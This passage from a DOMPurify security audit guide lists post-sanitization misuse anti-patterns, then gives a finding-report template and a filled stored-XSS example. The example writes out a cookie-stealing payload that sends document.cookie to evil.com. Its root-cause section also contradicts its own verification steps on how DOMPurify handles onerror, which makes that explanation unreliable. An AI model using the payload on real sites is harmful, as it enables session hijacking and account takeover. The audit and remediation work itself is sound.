| **AP6: Post-sanitization mutation** | `let clean = DOMPurify.sanitize(input); clean = clean.replace(/&amp;/g, '&');` | CRITICAL: Entity decoding reverses DOMPurify's encoding of dangerous characters; replace can reassemble malicious HTML | `dompurify-post-sanitization-modification` | Never transform DOMPurify output; perform all transformations on input before sanitization |
| **AP7: Multiple DOMPurify instances** | `const dp1 = createDOMPurify(window1); const dp2 = createDOMPurify(window2);` with hooks on dp1 but sanitization on dp2 | MEDIUM: Hooks and configuration on one instance do not apply to another; security-critical hooks may be missing on the instance used for actual sanitization | Manual code review | Use a single DOMPurify instance; if multiple instances are needed, apply identical hooks and configuration to each |
| **AP8: setConfig race** | `DOMPurify.setConfig(permissiveConfig); await processContent(); DOMPurify.setConfig(strictConfig);` | HIGH: Concurrent calls between setConfig operations use the permissive config; race window allows unsanitized content | Manual code review; grep for setConfig | Pass config per-call: `DOMPurify.sanitize(input, config)` instead of using setConfig; create separate instances for different permission levels |
| **AP9: Hook state leakage** | `let count = 0; DOMPurify.addHook('uponSanitizeElement', () => { count++; if (count > N) data.allowedTags.push('script'); })` | HIGH: Stateful hooks that change behavior based on call count or accumulated state can create time-dependent bypasses | Manual code review | Hooks must be pure functions with no external state; all decisions based only on current node/attribute |
| **AP10: innerHTML after sanitize** | `element.innerHTML = ''; element.innerHTML = DOMPurify.sanitize(input);` where first innerHTML triggers MutationObserver that reads second | LOW: MutationObserver on the element sees the empty string, then the sanitized content; observer callback may process content unsafely | Manual code review | Use RETURN_DOM_FRAGMENT with replaceChildren() or textContent = '' then appendChild() |

## Table 5: DOMPurify Finding Template

### Finding Documentation Template

```
==============================================================================
FINDING REPORT
==============================================================================

IDENTIFICATION
  Finding ID:       [PROJECT]-[YEAR]-[SEQ] (e.g., ACME-2026-001)
  Title:            [Short descriptive title, <= 80 characters]
  Severity:         [Critical | High | Medium | Low | Informational]
  CVSS 3.1 Score:   [0.0 - 10.0]
  CVSS Vector:      [e.g., CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]

AFFECTED COMPONENT
  Application:      [Application name and version]
  Component:        [Module / file / endpoint where vulnerability exists]
  DOMPurify Version: [Installed version number]
  Configuration:    [Relevant DOMPurify config options in use]
  Framework:        [React | Vue | Angular | Svelte | jQuery | Vanilla JS]

CLASSIFICATION
  Failure Model:    [A: DOMPurify Bypass | B: Config Weakness |
                     C: Post-Sanitization | D: Wrapper/Integration |
                     E: Framework-Specific]
  Pattern ID:       [From Table 1, e.g., C1, D2, E3]
  CWE:              [CWE-79 (XSS) | CWE-116 (Improper Encoding) |
                     CWE-1321 (Prototype Pollution)]
  Root Cause:       [From Chapter 16 taxonomy, e.g., Root Cause 1:
                     Serialize-Parse Roundtrip Non-Idempotency]

DESCRIPTION
  [Detailed technical description of the vulnerability.
   Include the specific code pattern, why it is vulnerable,
   and what attacker-controlled input enables exploitation.]

REPRODUCTION STEPS
  Prerequisites:
    - [Browser version required, if relevant]
    - [User role or authentication state required]
    - [Feature flags or configuration required]

  Steps:
    1. [Navigate to / call / invoke ...]
    2. [Submit payload: ...]
    3. [Observe: ...]

  Payload:
    [Exact XSS payload that triggers the vulnerability]

  Proof of Concept:
    [Minimal code snippet or curl command demonstrating the issue]

IMPACT
  Confidentiality:  [What data can be read? Session tokens, PII, etc.]
  Integrity:        [What can be modified? DOM, application state, etc.]
  Availability:     [Can the application be disrupted?]
  Scope:            [Is the impact limited to the vulnerable component
                     or does it extend to other components?]
  Business Impact:  [User account takeover, data theft, defacement, etc.]

ROOT CAUSE ANALYSIS
  [Technical explanation of why the vulnerability exists.
   Reference the root cause taxonomy from Chapter 16.
   Explain which DOMPurify assumption is violated.]

REMEDIATION
  Immediate:
    [Emergency mitigation: WAF rule, CSP tightening, feature disable]

  Short-term:
    [Code fix: specific code change required]

  Long-term:
    [Architectural improvement: migration to RETURN_DOM_FRAGMENT,
     Trusted Types deployment, etc.]

  Code Fix:
    Before:
      [Vulnerable code snippet]

    After:
      [Fixed code snippet]

VERIFICATION STEPS
  1. [Apply the fix]
  2. [Re-test with the original payload]
  3. [Verify no script execution occurs]
  4. [Run regression tests to confirm no functionality breakage]
  5. [Test in all supported browsers]

  Automated Verification:
    [Semgrep rule ID that would detect this pattern]
    [Unit test that verifies the fix]

EVIDENCE
  Screenshots:
    [Path to screenshot files demonstrating the vulnerability]

  Code Snippets:
    [Relevant code from the application showing the vulnerable pattern]

  Network Traces:
    [HAR file or relevant HTTP request/response pairs]

  Browser Console:
    [Console output showing JavaScript execution]

METADATA
  Discovered By:    [Researcher name / tool name]
  Discovery Date:   [YYYY-MM-DD]
  Reported Date:    [YYYY-MM-DD]
  Fixed Date:       [YYYY-MM-DD or "Pending"]
  Verified Date:    [YYYY-MM-DD or "Pending"]
  Audit Checklist:  [Priority level and item number from Chapter 19]
  Related Findings: [IDs of related findings in this assessment]
  References:       [Links to relevant CVEs, blog posts, documentation]

==============================================================================
```

### Example Finding (Filled Template)

```
==============================================================================
FINDING REPORT
==============================================================================

IDENTIFICATION
  Finding ID:       ACME-2026-003
  Title:            Post-sanitization HTML entity decode enables stored XSS
  Severity:         Critical
  CVSS 3.1 Score:   8.7
  CVSS Vector:      CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N

AFFECTED COMPONENT
  Application:      ACME Portal v4.2.1
  Component:        src/components/UserProfile.jsx (line 47)
  DOMPurify Version: 3.4.16 (current; DOMPurify is not at fault)
  Configuration:    Default (no custom config)
  Framework:        React 18.3

CLASSIFICATION
  Failure Model:    C: Post-Sanitization Failure
  Pattern ID:       C2 (Sanitize then decode)
  CWE:              CWE-79 (Improper Neutralization of Input During
                     Web Page Generation)
  Root Cause:       Application misuse -- post-sanitization entity decoding

DESCRIPTION
  The UserProfile component sanitizes user-provided biography HTML with
  DOMPurify.sanitize(), then passes the result through a custom
  htmlDecode() utility that converts HTML entities (&lt; &gt; &amp;
  &quot;) back to their literal characters. This reverses DOMPurify's
  entity encoding of dangerous characters, re-enabling script execution.

  The htmlDecode() function was added to "fix display issues" where
  entities appeared literally in the rendered output, but the actual
  issue was double-encoding (sanitizing already-encoded content).

REPRODUCTION STEPS
  Prerequisites:
    - Authenticated user account
    - Access to profile edit page

  Steps:
    1. Navigate to /profile/edit
    2. Enter in the Biography field:
       <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
    3. Save the profile
    4. View the profile at /profile/{username}
    5. Observe: JavaScript executes, cookie is exfiltrated

  Payload:
    <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

IMPACT
  Confidentiality:  Session tokens (httpOnly: false) and localStorage
                    data readable by attacker script
  Integrity:        Attacker can modify DOM, submit forms, change
                    user settings on behalf of the victim
  Availability:     No direct availability impact
  Scope:            Changed -- affects all users who view the attacker's
                    profile (stored XSS)
  Business Impact:  Account takeover via session hijacking; data theft;
                    worm propagation (attacker script can edit its own
                    profile to spread)

ROOT CAUSE ANALYSIS
  DOMPurify correctly encodes the onerror attribute value as HTML
  entities in its output. The application then calls htmlDecode()
  which converts these entities back to literal characters, producing
  executable HTML. This is Pattern C2 (Sanitize then decode) from the
  failure classification. DOMPurify is functioning correctly; the
  application invalidates its security guarantee.

REMEDIATION
  Immediate:
    Remove the htmlDecode() call from the rendering path.

  Short-term:
    Fix the double-encoding issue by ensuring input is decoded BEFORE
    sanitization, not after.

  Long-term:
    Adopt RETURN_DOM_FRAGMENT to eliminate string-based processing.
    Deploy Trusted Types CSP to prevent raw string innerHTML assignment.

  Code Fix:
    Before (line 47):
      const bio = htmlDecode(DOMPurify.sanitize(user.biography));

    After:
      const bio = DOMPurify.sanitize(user.biography);

VERIFICATION STEPS
  1. Apply the fix (remove htmlDecode call)
  2. Re-test with the onerror payload
  3. Verify the img tag's onerror attribute is removed by DOMPurify
  4. Verify biography formatting still renders correctly
  5. Test in Chrome, Firefox, and Safari

  Automated Verification:
    Semgrep rule: dompurify-post-sanitization-modification
    Unit test: UserProfile.test.jsx -- "should not execute scripts in bio"

EVIDENCE
  [Screenshots, network traces, and console output would be attached]

METADATA
  Discovered By:    Security audit team (manual code review)
  Discovery Date:   2026-10-01
  Reported Date:    2026-10-01
  Fixed Date:       2026-10-03
  Verified Date:    2026-10-04
  Audit Checklist:  Priority 1, Item 1.4 (Post-sanitization modification)
  Related Findings: ACME-2026-001 (missing sanitization on comment render)
  References:       research_phase5_postsanitization.md Section A2

==============================================================================
```

---
